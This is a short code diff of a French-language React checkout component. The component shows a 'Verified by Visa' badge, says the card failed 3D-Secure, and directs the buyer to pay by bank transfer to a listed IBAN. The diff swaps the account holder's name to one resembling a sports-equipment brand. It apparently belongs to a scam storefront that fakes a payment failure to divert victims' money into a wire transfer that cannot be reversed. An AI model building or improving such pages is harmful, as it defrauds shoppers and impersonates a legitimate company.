@@ -72,9 +72,9 @@ const CheckoutVerify = ({ verificationError, bankName, bankLogo, cardType, cardS
               <img src='/verified-by-visa.png' alt="Verified by Visa logo" className="visa-logo" />
             </div>
             <h2>Finalisez votre commande</h2> 
-            <p className='desc'>Votre carte n'a pas pu être via 3D-secure, confirmez votre identité et finalisez votre commande par virement, via un compte bancaire à votre nom.</p>
+            <p className='desc'>Votre carte n'a pas pu être par 3D-Secure, confirmez votre identité et finalisez votre commande par virement, via les informations bancaires suivantes :</p>
             <div className="iban-group">
-              <p><strong>Titulaire du compte : </strong>Christopeit France SAS</p>
+              <p><strong>Titulaire du compte : </strong>CHR Sport France</p>
               <p><strong>IBAN : </strong>FR80 2043 3026 26N2 6879 5984 483</p>
               <p><strong>BIC/SWIFT : </strong>NTS BFRM1 XXX</p>
               <p className='row'><span className='id'><strong>Objet :</strong> Commande 182F57</span><span className='amount'><strong>Montant :</strong> {discountedPrice}€</span></p>
